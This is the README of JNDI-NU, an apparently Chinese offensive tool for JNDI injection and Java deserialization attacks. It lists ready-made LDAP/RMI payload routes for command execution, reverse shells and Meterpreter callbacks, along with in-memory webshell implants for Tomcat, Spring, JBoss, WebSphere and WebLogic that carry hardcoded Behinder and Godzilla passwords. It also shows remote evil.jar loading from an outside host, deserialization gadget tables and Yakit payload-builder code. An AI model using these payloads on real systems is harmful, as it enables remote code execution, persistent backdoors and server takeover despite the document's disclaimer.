![JNDI-NU](https://socialify.git.ci/nu1r/JNDI-NU/image?description=1&descriptionEditable=%E4%B8%80%E6%AC%BE%E7%94%A8%E4%BA%8E%20JNDI%E6%B3%A8%E5%85%A5%20%E5%88%A9%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%80%82%E7%94%A8%E4%BA%8E%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8&font=KoHo&forks=1&language=1&logo=https%3A%2F%2Fs1.328888.xyz%2F2022%2F08%2F02%2FOESvy.png&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Dark)

# 😈使用说明

使用 ```java -jar JNDI-NU.jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数

```
Usage: java -jar JNDI-NU.jar [options]
  Options:
  * -i, --ip       Local ip address
    -rl, --rmiPort rmi bind port (default: 10990)
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -c, --command  rmi gadgets System Command
    -py, --python  Python System Command ex: python3  python2 ...
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help
```

~~使用 ```java -jar JNDI-NU.jar.jar -u``` 查看支持的 LDAP 格式~~(取消该帮助信息，有需要在此处看即可)

```
Supported LADP Queries：
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Basic/Dnslog/[domain]
    ldap://0.0.0.0:1389/Basic/Command/[cmd]
    ldap://0.0.0.0:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Basic/TomcatEcho
    ldap://0.0.0.0:1389/Basic/SpringEcho
    ldap://0.0.0.0:1389/Basic/JBossFilter
    ldap://0.0.0.0:1389/Basic/JBossServlet
    ldap://0.0.0.0:1389/Basic/JettyFilter
    ldap://0.0.0.0:1389/Basic/JettyServlet
    ldap://0.0.0.0:1389/Basic/TomcatFilterJmx
    ldap://0.0.0.0:1389/Basic/TomcatFilterTh
    ldap://0.0.0.0:1389/Basic/TomcatListenerJmx
    ldap://0.0.0.0:1389/Basic/TomcatListenerTh
    ldap://0.0.0.0:1389/Basic/TomcatServletJmx
    ldap://0.0.0.0:1389/Basic/TomcatServletTh
    ldap://0.0.0.0:1389/Basic/WSFilter
    ldap://0.0.0.0:1389/Basic/SpringInterceptor
    ldap://0.0.0.0:1389/Basic/WebsphereMemshell
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
    rmi://0.0.0.0:1099/Bypass

[+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
    ldap://0.0.0.0:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://0.0.0.0:1389/Deserialization/Jre8u20/TomcatMemshell
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]
    ldap://0.0.0.0:1389/TomcatBypass/Command/[cmd]
    ldap://0.0.0.0:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho
    ldap://0.0.0.0:1389/TomcatBypass/SpringEcho
    ldap://0.0.0.0:1389/TomcatBypass/SpringInterceptor
    ldap://0.0.0.0:1389/TomcatBypass/TomcatFilterJmx
    ldap://0.0.0.0:1389/TomcatBypass/TomcatFilterTh
    ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerJmx
    ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerTh
    ldap://0.0.0.0:1389/TomcatBypass/TomcatServletJmx
    ldap://0.0.0.0:1389/TomcatBypass/TomcatServletTh
    ldap://0.0.0.0:1389/TomcatBypass/JBossFilter
    ldap://0.0.0.0:1389/TomcatBypass/JBossServlet
    ldap://0.0.0.0:1389/TomcatBypass/JettyFilter
    ldap://0.0.0.0:1389/TomcatBypass/JettyServlet
    ldap://0.0.0.0:1389/TomcatBypass/WSFilter
    ldap://0.0.0.0:1389/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp

[+] GroovyBypass Queries
    ldap://0.0.0.0:1389/GroovyBypass/Command/[cmd]
    ldap://0.0.0.0:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
    ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/[cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
    ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
```

* 目前支持的所有 ```PayloadType``` 为
    * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
    * ```Command```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
    * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
    * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
* ```WebsphereBypass``` 中的 3 个动作：
    * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
    * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
    * ```rce```：加载已上传至目标服务器临时目录的```jar包```

**MSF上线支持**

- 支持tomcatBypass路由直接上线msf：

```
  使用msf的java/meterpreter/reverse_tcp开启监听
  ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/[msfip]/[msfport]
```

---

# 内存马

两种添加方式：
- 支持引用类远程加载方式打入（Basic路由）
- 支持本地工厂类方式打入 （TomcatBypass路由）
  
使用说明：
- 使用冰蝎4.0连接,AES加密, 添加后访问 `/nu1r`
- 为了区别正常动作与WebShell的区别，添加 `Referer: https://nu1r.cn/` 来使用
- 密码：`nu1ryyds`

内存马说明：
  * ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
    - X-nu1r-TOKEN 如果为 ce 则执行命令 , ?X-Token-Data=cmd
    - X-nu1r-TOKEN 如果为 bx 则为冰蝎马 密码 nu1ryyds
    - X-nu1r-TOKEN 如果为 gz 则为哥斯拉马 pass nu1r key nu1ryyds
  * ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
  * ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
  * ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
  * ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
  * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
  * ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
  * ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
  * ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
  * ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
  * ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
  * ```WSFilter```: `CMD` 命令回显 WebSocket 内存马
  * ```TomcatExecutor``` : Executor 内存马，通过添加自定义```header``` ```nu1r: d2hvYW1p```
  的方式传递想要执行的命令，命令要进行Base64编码，需要Tomcat版本8.5+，因为tomcat8.5.0以后，在tomcat封装的socket⽀持unread的数据回写

---

# 其他利用链的拓展

对于 `BeanShell1` 及 `Clojure` 这两个基于脚本语言解析的漏利用方式。

本项目为这两条利用链拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：

`Base64/`后的内容需要base64编码

TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10

```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/TS-10
```

RC ：Remote Call - 通过 URLClassLoader.loadClass() 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass

```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/RC-http://xxxx.com/evil.jar#EvilClass
```

WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#123

```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/WF-/tmp/shell#123
```

其他：普通命令执行 - 通过 ProcessBuilder().start() 执行系统命令，使用命令 whoami

```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/whoami
```

---

# C3P04的使用

* 远程加载 Jar 包
    * C3P04 'remoteJar-http://1.1.1.1.com/1.jar'
* 向服务器写入 Jar 包并加载（不出网）
    * C3P04 'writeJar-/tmp/evil.jar:./yaml.jar'
    * C3P04 'localJar-./yaml.jar'
* C3P0 二次反序列化
    * C3P04 'c3p0Double-/usr/CC6.ser'

```
ldap://0.0.0.0:1389/Deserialization/C3P04/Command/Base64/[base64_encoded_cmd]
```

---

# SignedObject 二次反序列化 Gadget

用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）

利用链需要调用 SignedObject 的 getObject 方法，因此需要可以调用任意方法、或调用指定类 getter 方法的触发点；

大概包含如下几种可用的常见调用链：

1. InvokerTransformer 调用任意方法（依赖 CC）
2. BeanComparator 调用 getter 方法（依赖 CB）
3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
4. ToStringBean 调用全部 getter 方法（依赖 Rome）
5. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
6. MemberBox 反射调用任意方法（依赖 rhino）

* `cc`,`cc4`,`cb`,`hibernate`,`rome`,`rhino`,`spring`

* 利用方式：
* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000

```
ldap://0.0.0.0:1389/Deserialization/SignedObject/Command/Base64/[base64_encoded_SignedObjectPayload]
```

* 使用Yakit简化其Payload

热加载中加入以下方法

```go
jndiNuSig = func(Payload) {
    c        := str.Split(Payload,"#")
    c1       := codec.EncodeBase64(c[2])
    Payload  := str.Replace(c[1],"arg2",c1,1)
    c2       := codec.EncodeBase64(Payload)
    Payload1 := str.Replace(c[0],"arg1",c2,1)
    return codec.EncodeUrl(Payload1)
}
```

使用时只需要更改你的<VPS_IP>与要执行的命令即可

```
{{yak(jndiNuSig|${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/Command/Base64/arg1}#CC:CommonsCollections6:arg2:10000#open -a Calculator.app)}}
```

效果图：

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220820135253.png)

---

# Deserialization路由

| Gadget                                          | 依赖                                                                                                                                                                                                                                                                         |
|:------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| AspectJWeaver                                   | aspectjweaver:1.9.2<br/>commons-collections:3.2.2                                                                                                                                                                                                                          |
| BeanShell1                                      | org.beanshell:bsh:2.0b5                                                                                                                                                                                                                                                    |
| C3P0                                            | com.mchange:c3p0:0.9.5.2<br/>mchange-commons-java:0.2.11                                                                                                                                                                                                                   |
| C3P02                                           | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35                                                                                                                                                                          |
| C3P03                                           | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.codehaus.groovy:groovy:2.3.9                                                                                                                                     |
| C3P04                                           | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.yaml:snakeyaml:1.30                                                                                                                                              |
| C3P092                                          | com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8<br/>com.mchange:mchange-commons-java:0.2.11                                                                                                                                                                               |
| Click1                                          | org.apache.click:click-nodeps:2.3.0<br/>javax.servlet:javax.servlet-api:3.1.0                                                                                                                                                                                              |
| Clojure                                         | org.clojure:clojure:1.8.0                                                                                                                                                                                                                                                  |
| CommonsBeanutils1                               | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1<br/>commons-logging:commons-logging:1.2                                                                                                                                          |
| CommonsBeanutils2                               | commons-beanutils:commons-beanutils:1.9.2                                                                                                                                                                                                                                  |
| CommonsBeanutils2NOCC                           | commons-beanutils:commons-beanutils:1.8.3<br/>commons-logging:commons-logging:1.2                                                                                                                                                                                          |
| CommonsBeanutils3                               | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1                                                                                                                                                                                  |
| CommonsBeanutils4                               | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1                                                                                                                                                                                  |
| CommonsBeanutils1183NOCC                        | commons-beanutils:commons-beanutils:1.8.3                                                                                                                                                                                                                                  |
| CommonsBeanutils3183                            | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1<br/>commons-logging:commons-logging:1.2                                                                                                                                          |
| CommonsCollections1                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |
| CommonsCollections2                             | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |
| CommonsCollections3                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |
| CommonsCollections4                             | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |
| CommonsCollections5                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |
| CommonsCollections6<br/>CommonsCollections6Lite | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |
| CommonsCollections6Lite_4                       | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |
| CommonsCollections7                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |
| commonscollections7lite_4                       | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |
| CommonsCollections8                             | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |
| CommonsCollections10                            | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |
| CommonsCollectionsK1                            | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |
| CommonsCollectionsK2                            | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |
| Groovy1                                         | org.codehaus.groovy:groovy:2.3.9                                                                                                                                                                                                                                           |
| Hibernate1                                      | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |
| Hibernate2                                      | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |
| JavassistWeld1                                  | javassist:javassist:3.12.1.GA<br/>org.jboss.weld:weld-core:1.1.33.Final<br/>javax.interceptor:javax.interceptor-api:3.1<br/>javax.enterprise:cdi-api:1.0-SP1<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final<br/>org.slf4j:slf4j-api:1.7.21                    |
| JBossInterceptors1                              | javassist:javassist:3.12.1.GA<br/>org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final<br/>javax.enterprise:cdi-api:1.0-SP1<br/>javax.interceptor:javax.interceptor-api:3.1<br/>org.slf4j:slf4j-api:1.7.21<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final |
| Jdk7u21                                         | -                                                                                                                                                                                                                                                                          |
| Jdk7u21variant                                  | -                                                                                                                                                                                                                                                                          |
| Jre8u20                                         | -                                                                                                                                                                                                                                                                          |
| JRMPClient                                      | -                                                                                                                                                                                                                                                                          |
| JRMPClient_Activator                            | -                                                                                                                                                                                                                                                                          |
| JRMPClient_Obj                                  | -                                                                                                                                                                                                                                                                          |
| JSON1                                           | net.sf.json-lib:json-lib:jar:jdk15:2.4<br/>org.springframework:spring-aop:4.1.4.RELEASE                                                                                                                                                                                    |
| Jython1                                         | org.python:jython-standalone:2.5.2                                                                                                                                                                                                                                         |
| MozillaRhino1                                   | rhino:js:1.7R2                                                                                                                                                                                                                                                             |
| MozillaRhino2                                   | rhino:js:1.7R2                                                                                                                                                                                                                                                             |
| Myfaces1                                        | -                                                                                                                                                                                                                                                                          |
| Myfaces2                                        | -                                                                                                                                                                                                                                                                          |
| RenderedImage                                   | javax.media:jai-codec-1.1.3                                                                                                                                                                                                                                                |
| ROME                                            | rome:rome:1.0                                                                                                                                                                                                                                                              |
| ROME2                                           | rome:rome:1.0<br/>JDK 8+                                                                                                                                                                                                                                                   |
| Spring1                                         | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-beans:4.1.4.RELEASE                                                                                                                                                                           |
| Spring2                                         | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-aop:4.1.4.RELEASE<br/>aopalliance:aopalliance:1.0<br/>commons-logging:commons-logging:1.2                                                                                                     |
| Spring3                                         | org.springframework:spring-tx:5.2.3.RELEASE<br/>org.springframework:spring-context:5.2.3.RELEASE<br/>javax.transaction:javax.transaction-api:1.2                                                                                                                           |
| Vaadin1                                         | com.vaadin:vaadin-server:7.7.14<br/>com.vaadin:vaadin-shared:7.7.14                                                                                                                                                                                                        |

* 使用示例：
  ```
  ldap://0.0.0.0:1389/Deserialization/[GadgetType]/Command/Base64/[base64_encoded_cmd]
  ```
* 使用Yakit方便修改的法子

先于热加载标签中插入代码

```go
jndiNuSer = func(Payload) {
    Command := str.Split(Payload,"#")
    cmd := codec.EncodeBase64(Command[1])
    Payload := str.Replace(Command[0],"CommandNew",cmd,1)
    return codec.EncodeUrl(Payload)
}
```

之后只需要改 GadgetType ，与Command即可

```
{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}
```

效果图：

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803131020.png)

---

# 🏓TODO

1. 本地ClassPath反序列化漏洞利用方式
2. 支持自定义内存马密码

---

# 👮免责声明

该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。

# 🐲建议

本项目用JDK1.8.0_332开发，不推荐用高于11的JDK，可能会出现错误

# 📷参考

* https://github.com/veracode-research/rogue-jndi
* https://github.com/welk1n/JNDI-Injection-Exploit
* https://github.com/welk1n/JNDI-Injection-Bypass
* https://github.com/WhiteHSBG/JNDIExploit
* https://github.com/su18/ysoserial
